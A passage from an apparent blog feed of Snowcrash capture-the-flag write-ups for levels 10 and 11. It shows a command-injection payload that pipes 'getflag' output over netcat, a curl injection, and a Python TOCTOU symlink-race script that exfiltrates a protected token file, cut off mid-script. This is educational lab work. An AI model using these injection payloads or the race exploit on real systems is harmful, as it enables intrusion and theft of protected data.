<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ nc -l <span style="color:#ae81ff">1234</span> &amp;
$ curl localhost:4646?x<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;`/*/LVL10`&#39;</span>
Check flag.Here is your token : <span style="color:#f92672">[</span> ... output omitted ... <span style="color:#f92672">]</span>
..<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>+  Done                    nc -l <span style="color:#ae81ff">1234</span>
</code></pre></div>]]></content>
        </item>
        
        <item>
            <title>Snowcrash - Level11</title>
            <link>/posts/snowcrash/level11/</link>
            <pubDate>Mon, 03 Aug 2020 15:56:10 +0200</pubDate>
            
            <guid>/posts/snowcrash/level11/</guid>
            <description>On connection we have access to a lua script that is already running.
The server #!/usr/bin/env lua local socket = require(&amp;#34;socket&amp;#34;) local server = assert(socket.bind(&amp;#34;127.0.0.1&amp;#34;, 5151)) function hash(pass) prog = io.popen(&amp;#34;echo &amp;#34;..pass..&amp;#34; | sha1sum&amp;#34;, &amp;#34;r&amp;#34;) data = prog:read(&amp;#34;*all&amp;#34;) prog:close() data = string.sub(data, 1, 40) return data end while 1 do local client = server:accept() client:send(&amp;#34;Password: &amp;#34;) client:settimeout(60) local l, err = client:receive() if not err then print(&amp;#34;trying &amp;#34; .. l) local h = hash(l) if h ~= &amp;#34;f05d1d066fb246efe0c6f7d095f909a7a0cf34a0&amp;#34; then client:send(&amp;#34;Erf nope.</description>
            <content type="html"><![CDATA[<p>On connection we have access to a lua script that is already running.</p>
<h2 id="the-server">The server</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-lua" data-lang="lua"><span style="color:#75715e">#!/usr/bin/env lua</span>
<span style="color:#66d9ef">local</span> socket <span style="color:#f92672">=</span> require(<span style="color:#e6db74">&#34;socket&#34;</span>)
<span style="color:#66d9ef">local</span> server <span style="color:#f92672">=</span> assert(socket.bind(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>, <span style="color:#ae81ff">5151</span>))

<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">hash</span>(pass)
  prog <span style="color:#f92672">=</span> io.popen(<span style="color:#e6db74">&#34;echo &#34;</span><span style="color:#f92672">..</span>pass<span style="color:#f92672">..</span><span style="color:#e6db74">&#34; | sha1sum&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>)
  data <span style="color:#f92672">=</span> prog:read(<span style="color:#e6db74">&#34;*all&#34;</span>)
  prog:close()

  data <span style="color:#f92672">=</span> string.sub(data, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">40</span>)

  <span style="color:#66d9ef">return</span> data
<span style="color:#66d9ef">end</span>


<span style="color:#66d9ef">while</span> <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">do</span>
  <span style="color:#66d9ef">local</span> client <span style="color:#f92672">=</span> server:accept()
  client:send(<span style="color:#e6db74">&#34;Password: &#34;</span>)
  client:settimeout(<span style="color:#ae81ff">60</span>)
  <span style="color:#66d9ef">local</span> l, err <span style="color:#f92672">=</span> client:receive()
  <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> err <span style="color:#66d9ef">then</span>
      print(<span style="color:#e6db74">&#34;trying &#34;</span> <span style="color:#f92672">..</span> l)
      <span style="color:#66d9ef">local</span> h <span style="color:#f92672">=</span> hash(l)

      <span style="color:#66d9ef">if</span> h <span style="color:#f92672">~=</span> <span style="color:#e6db74">&#34;f05d1d066fb246efe0c6f7d095f909a7a0cf34a0&#34;</span> <span style="color:#66d9ef">then</span>
          client:send(<span style="color:#e6db74">&#34;Erf nope..</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
      <span style="color:#66d9ef">else</span>
          client:send(<span style="color:#e6db74">&#34;Gz you dumb*</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
      <span style="color:#66d9ef">end</span>

  <span style="color:#66d9ef">end</span>

  client:close()
<span style="color:#66d9ef">end</span>
</code></pre></div><p>The script do the following:</p>
<ol>
<li>Wait for client to connect from <code>localhost</code></li>
<li>Receive a password from Client</li>
<li>Retrieve the hash of the password with <code>hash()</code></li>
<li>Print text depending on the hash</li>
<li>Close the client connection</li>
</ol>
<h2 id="the-flaw">The Flaw</h2>
<p>The flaw in <code>level11</code> is located in <code>hash()</code>.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-lua" data-lang="lua"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">hash</span>(pass)
  prog <span style="color:#f92672">=</span> io.popen(<span style="color:#e6db74">&#34;echo &#34;</span><span style="color:#f92672">..</span>pass<span style="color:#f92672">..</span><span style="color:#e6db74">&#34; | sha1sum&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>)
  data <span style="color:#f92672">=</span> prog:read(<span style="color:#e6db74">&#34;*all&#34;</span>)
  prog:close()

  data <span style="color:#f92672">=</span> string.sub(data, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">40</span>)

  <span style="color:#66d9ef">return</span> data
<span style="color:#66d9ef">end</span>
</code></pre></td></tr></table>
</div>
</div><p>Here, his input <code>pass</code> is used in a shell command ( line 2 ) without sanitizing.
Because of that flaw, we can execute abritary code.</p>
<h2 id="the-payload">The payload</h2>
<p>For the payload, we have access to a lot of possibility.<br>
Here is my solution, I execute <code>getflag</code> to retreive the flag and send the result using <code>netcat</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">; getflag | nc 127.0.0.1 <span style="color:#ae81ff">1234</span>
</code></pre></div><p>before connecting to the service, we need to start the server that will listen for data on port <code>1234</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ nc -l <span style="color:#ae81ff">1234</span> &amp;
<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> <span style="color:#ae81ff">14921</span>
$ echo <span style="color:#e6db74">&#34;; getflag | nc 127.0.0.1 1234&#34;</span> | nc 127.0.0.1 <span style="color:#ae81ff">5151</span>
Password: Check flag.Here is your token : <span style="color:#f92672">[</span> ... output omitted ... <span style="color:#f92672">]</span>
Erf nope..
<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>+  Done
</code></pre></div>]]></content>
        </item>
        
        <item>
            <title>Snowcrash - Level10</title>
            <link>/posts/snowcrash/level10/</link>
            <pubDate>Mon, 03 Aug 2020 15:55:09 +0200</pubDate>
            
            <guid>/posts/snowcrash/level10/</guid>
            <description>On connection, we are greeted by the 2 following file.
$ ls -l total 16 -rwsr-sr-x+ 1 flag10 level10 10817 Mar 5 2016 level10 -rw------- 1 flag10 flag10 26 Mar 5 2016 token Pseudo code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49  int main(int argc, char **argv) { char *host; char *file; int socketfd; int fd; int rc; char buffer [4096]; sockaddr_in addr; if (argc &amp;lt; 3) { errx(1, &amp;#34;%s file host\n\tsends file to host if you have access to it\n&amp;#34;, argv[0]); } file = argv[1]; host = argv[2]; if (access(argv[1], R_OK) == 0) { printf(&amp;#34;Connecting to %s:6969 .</description>
            <content type="html"><![CDATA[<p>On connection, we are greeted by the 2 following file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ls -l
total <span style="color:#ae81ff">16</span>
-rwsr-sr-x+ <span style="color:#ae81ff">1</span> flag10 level10 <span style="color:#ae81ff">10817</span> Mar  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2016</span> level10
-rw-------  <span style="color:#ae81ff">1</span> flag10 flag10     <span style="color:#ae81ff">26</span> Mar  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2016</span> token
</code></pre></div><h2 id="pseudo-code">Pseudo code</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
{
    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>host;
    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>file;
    <span style="color:#66d9ef">int</span> socketfd;
    <span style="color:#66d9ef">int</span> fd;
    <span style="color:#66d9ef">int</span> rc;
    <span style="color:#66d9ef">char</span> buffer [<span style="color:#ae81ff">4096</span>];
    sockaddr_in addr;

    <span style="color:#66d9ef">if</span> (argc <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span>) {
        errx(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;%s file host</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">sends file to host if you have access to it</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, argv[<span style="color:#ae81ff">0</span>]);
    }
    file <span style="color:#f92672">=</span> argv[<span style="color:#ae81ff">1</span>];
    host <span style="color:#f92672">=</span> argv[<span style="color:#ae81ff">2</span>];
    <span style="color:#66d9ef">if</span> (access(argv[<span style="color:#ae81ff">1</span>], R_OK) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
        printf(<span style="color:#e6db74">&#34;Connecting to %s:6969 .. &#34;</span>, host);
        fflush(stdout);
        socketfd <span style="color:#f92672">=</span> socket(PF_INET, SOCK_STREAM, PF_UNSPEC);
        addr <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> }
        addr.sin_family <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>;
        addr.sin_addr <span style="color:#f92672">=</span> inet_addr(host);
        addr.sin_port <span style="color:#f92672">=</span> htons(<span style="color:#ae81ff">6969</span>);
        fd <span style="color:#f92672">=</span> connect(socketfd, (sockaddr <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>addr, <span style="color:#66d9ef">sizeof</span>(addr));
        <span style="color:#66d9ef">if</span> (fd <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
            errx(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;Unable to connect to host %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, host);
        }
        n <span style="color:#f92672">=</span> write(socketfd, <span style="color:#e6db74">&#34;.*( )*.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">8</span>);
        <span style="color:#66d9ef">if</span> (n <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
            errx(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;Unable to write banner to host %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, host);
        }
        printf(<span style="color:#e6db74">&#34;Connected!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Sending file .. &#34;</span>);
        fflush(stdout);
        fd <span style="color:#f92672">=</span> open(file, O_RDONLY);
        <span style="color:#66d9ef">if</span> (fd <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
            errx(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;Damn. Unable to open file&#34;</span>);
        }
        n <span style="color:#f92672">=</span> read(fd, buffer, <span style="color:#66d9ef">sizeof</span>(buffer));
        <span style="color:#66d9ef">if</span> (n <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
            err(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;Unable to read from file&#34;</span>);
        }
        write(socketfd, buffer, n);
        rc <span style="color:#f92672">=</span> puts(<span style="color:#e6db74">&#34;wrote file!&#34;</span>);
    }
    <span style="color:#66d9ef">else</span> {
        rc <span style="color:#f92672">=</span> printf(<span style="color:#e6db74">&#34;You don</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">t have access to %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,file);
    }
    <span style="color:#66d9ef">return</span> rc;
}
</code></pre></td></tr></table>
</div>
</div><p>The pseudo code do the following:</p>
<ol>
<li>Check if we have at least 2 argument</li>
<li>Check if the file from argument is readable</li>
<li>Try connecting to the host from argument on port 6969
<ol>
<li>Write the banner on the host</li>
</ol>
</li>
<li>Open the file in readonly</li>
<li>Read the file</li>
<li>Write the content of file to host</li>
</ol>
<h2 id="the-flaw">The flaw</h2>
<p><code>level10</code> is susceptible to a <a href="/posts/glossary/toctou">TOCTOU</a>,
the file given as argument is checked with <code>access</code> then the file is open in a later call</p>
<p>To exploit the flaw, we need the following execution sequences:</p>
<ol>
<li>create a readable file for the user</li>
<li>create a server to accept connection of <code>level10</code></li>
<li>start <code>level10</code></li>
<li>when <code>level10</code> try to connect to the server
<ol>
<li>replace the readable file with <strong>token</strong> file using a sumlink</li>
<li>accept the connection of <code>level10</code></li>
</ol>
</li>
</ol>
<h2 id="the-script">The script</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> socket
<span style="color:#f92672">import</span> select
<span style="color:#f92672">import</span> logging <span style="color:#f92672">as</span> log
<span style="color:#f92672">from</span> argparse <span style="color:#f92672">import</span> ArgumentParser
<span style="color:#f92672">from</span> subprocess <span style="color:#f92672">import</span> Popen
<span style="color:#f92672">from</span> os <span style="color:#f92672">import</span> unlink, symlink, devnull

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">replace_file</span>(file, target):
    unlink(file)
    symlink(target, file)

log<span style="color:#f92672">.</span>basicConfig(level<span style="color:#f92672">=</span>log<span style="color:#f92672">.</span>INFO)

<span style="color:#75715e"># Parse argument</span>
parser <span style="color:#f92672">=</span> ArgumentParser()
parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;executable&#34;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;path to the executable&#34;</span>)
parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;file&#34;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;file path used by the program ( must be writable )&#34;</span>)
parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;target&#34;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;target file&#34;</span>)
args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()

<span style="color:#75715e"># Create scarecrow file</span>
unlink(args<span style="color:#f92672">.</span>file)
<span style="color:#66d9ef">with</span> open(args<span style="color:#f92672">.</span>file, <span style="color:#e6db74">&#39;w&#39;</span>) <span style="color:#66d9ef">as</span> f:
    f<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#34;foo&#34;</span>)

<span style="color:#75715e"># Create server socket</span>
server <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
server<span style="color:#f92672">.</span>bind((<span style="color:#e6db74">&#34;0.0.0.0&#34;</span>, <span style="color:#ae81ff">6969</span>))
server<span style="color:#f92672">.</span>listen(<span style="color:#ae81ff">1</span>)
log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;listening on: {}&#34;</span><span style="color:#f92672">.</span>format(server<span style="color:#f92672">.</span>getsockname()))

<span style="color:#75715e"># Run process</span>
proc_args <span style="color:#f92672">=</span> [ args<span style="color:#f92672">.</span>executable, args<span style="color:#f92672">.</span>file, <span style="color:#e6db74">&#34;127.0.0.1&#34;</span> ]
proc <span style="color:#f92672">=</span> Popen(proc_args, stdout<span style="color:#f92672">=</span>open(devnull, <span style="color:#e6db74">&#39;w&#39;</span>))
log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;launch subprocess: {}&#34;</span><span style="color:#f92672">.</span>format(proc_args))

<span style="color:#75715e"># Wait for process to connect</span>
inputs <span style="color:#f92672">=</span> []
read, _, _ <span style="color:#f92672">=</span> select<span style="color:#f92672">.</span>select([ server ], [], [])
<span style="color:#66d9ef">for</span> s <span style="color:#f92672">in</span> read:
    <span style="color:#66d9ef">if</span> s <span style="color:#f92672">is</span> server:
        replace_file(args<span style="color:#f92672">.</span>file, args<span style="color:#f92672">.</span>target)
        conn, caddr <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>accept()
        log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;[{}] connected&#34;</span><span style="color:#f92672">.</span>format(conn<span style="color:#f92672">.</span>getsockname()))
        inputs<span style="color:#f92672">.</span>append(conn)
    <span style="color:#66d9ef">else</span>:
        log<span style="color:#f92672">.</span>fatal(<span style="color:#e6db74">&#34;expected server socket, not something else: {}&#34;</span><span style="color:#f92672">.</span>format(s))

<span style="color:#75715e"># Read data from process</span>
<span style="color:#66d9ef">while</span> inputs:
    read, _, _ <span style="color:#f92672">=</span> select<span style="color:#f92672">.</span>select(inputs, [], [])
    <span style="color:#66d9ef">for</span> s <span style="color:#f92672">in</span> read:
        data <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
        <span style="color:#66d9ef">if</span> data:
